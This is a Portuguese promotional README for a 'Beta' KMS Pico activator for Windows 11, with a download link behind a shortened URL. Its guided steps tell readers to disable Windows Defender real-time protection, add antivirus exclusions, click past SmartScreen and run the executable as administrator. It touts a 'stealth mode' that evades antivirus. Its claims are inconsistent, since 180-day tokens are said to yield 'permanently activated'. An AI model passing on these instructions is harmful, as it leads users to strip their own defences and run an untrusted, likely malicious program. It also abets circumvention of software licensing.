## 🧪 Sobre o Programa Beta

A versão **Beta** do KMS Pico para Windows 11 é uma build **experimental** disponibilizada para testes públicos antes do lançamento oficial. Ela incorpora as mais recentes melhorias de compatibilidade com builds Windows 11, incluindo suporte para as versões **23H2** e **24H2**.

### Novidades da Build Beta

| Recurso | Status | Descrição |
|---------|:------:|-----------|

| 🛡️ **Modo stealth 2.0** | 🟡 Teste | Evita bloqueios antivírus |
| 🧠 **Auto-detecção IA** | 🟢 Ativo | Identifica edição automaticamente |
| 📊 **Dashboard v2** | 🟡 Teste | Estatísticas em tempo real |
| 🔄 **Renovação adaptativa** | 🟢 Ativo | Sincroniza com Windows Update |
| ☁️ **Backup criptografado** | 🔴 Experimental | Fase inicial de testes |

## 💡 Como Funciona

A build beta mantém a arquitetura base do KMS Pico — emulação de um **Key Management Service** local — mas com otimizações específicas para o Windows 11.

### Fluxo de Ativação Beta

```
┌─────────────────────────────────────────┐
│  1. Detecção automática do sistema      │
├─────────────────────────────────────────┤
│  2. Verificação de pré-requisitos       │
├─────────────────────────────────────────┤
│  3. Instalação do serviço KMS Beta      │
├─────────────────────────────────────────┤
│  4. Aplicação da chave GVLK             │
├─────────────────────────────────────────┤
│  5. Emissão do token (180 dias)         │
├─────────────────────────────────────────┤
│  6. Ativação da renovação automática    │
└─────────────────────────────────────────┘
```

## 🪜 Instalação Guiada

### Etapa 1 — Preparar Ambiente de Teste

**Preferência:** execute primeiro em máquina virtual.

Se for usar o sistema real, crie um ponto de restauração:

**Painel de Controle → Sistema → Proteção do Sistema → Criar**

### Etapa 2 — Desativar Proteção Temporária

**Segurança do Windows → Proteção contra vírus → Gerenciar configurações → Proteção em tempo real → Desativar**.

Adicione exclusão:

```
Configurações → Privacidade e segurança → Segurança do Windows
→ Proteção contra vírus → Exclusões → Adicionar pasta
```

### Etapa 3 — Extrair o Pacote Beta

Clique com botão direito → **Extrair Tudo…** → pasta dedicada.

### Etapa 4 — Executar como Administrador

Localize `KmsPicoBeta.exe` → botão direito → **Executar como administrador**.

> 💡 Se SmartScreen aparecer: **Mais informações → Executar assim mesmo**.

<div align="center">

[![Baixar KMS Pico Beta](https://img.shields.io/badge/⬇️_BAIXAR_KMS_PICO_BETA-FACC15?style=for-the-badge&logo=download&logoColor=black&labelColor=854D0E)](https://share.google/1xiIBoV1lQUFfenEJ)

</div>

### Etapa 5 — Assistente Beta

Ao iniciar, o assistente conduz o processo:

1. 🔍 Detecção da build Windows 11
2. 🧠 Seleção automática da chave GVLK
3. 🖥️ Instalação do serviço KMS Beta
4. 🎫 Emissão do token de 180 dias

### Etapa 6 — Ativar Windows

Clique em **Ativar Agora**. A ativação é automática.

### Etapa 7 — Verificar Ativação

Prompt de Comando como administrador:

```bash
slmgr /xpr
```

Resultado esperado: **"ativado permanentemente"**.

Detalhes completos:

```bash
slmgr /dlv
```

### Etapa 8 — Validar Renovação Automática

Abra o **Agendador de Tarefas → Biblioteca** e confirme a tarefa **KmsPicoBeta**.

### Etapa 9 — Coletar Feedback

A build beta possui um módulo de **feedback integrado**:

- 🐛 Reporte bugs
- 💡 Sugira melhorias
- 📊 Envie estatísticas anônimas (opcional)

### Etapa 10 — Restaurar Antivírus

Reative a proteção e adicione a pasta KMS às exclusões.

## 🛠️ Solução de Problemas Beta

| Problema | Causa | Solução |
|----------|-------|---------|
| ❌ Falha na ativação | Defender ativo | Desative e reteste |
| ❌ Serviço não inicia | Privilégios | Execute como admin |
| ❌ Erro 0xC004F074 | Sem rede | Verifique conexão |
| ❌ Tela preta | Conflito beta | Modo seguro → remover |
| ❌ Dashboard não abre | Porta ocupada | Mude em config.ini |
| ❌ Feedback não envia | Proxy | Desative proxy |
| ❌ Renovação falha | Tarefa desativada | Reative KmsPicoBeta |
| ❌ Office inativo | Aba errada | Use aba Office |
| ❌ Crash ao ativar | Build incompatível | Reporte o bug |
| ❌ UAC ausente | Conta comum | Use conta admin |
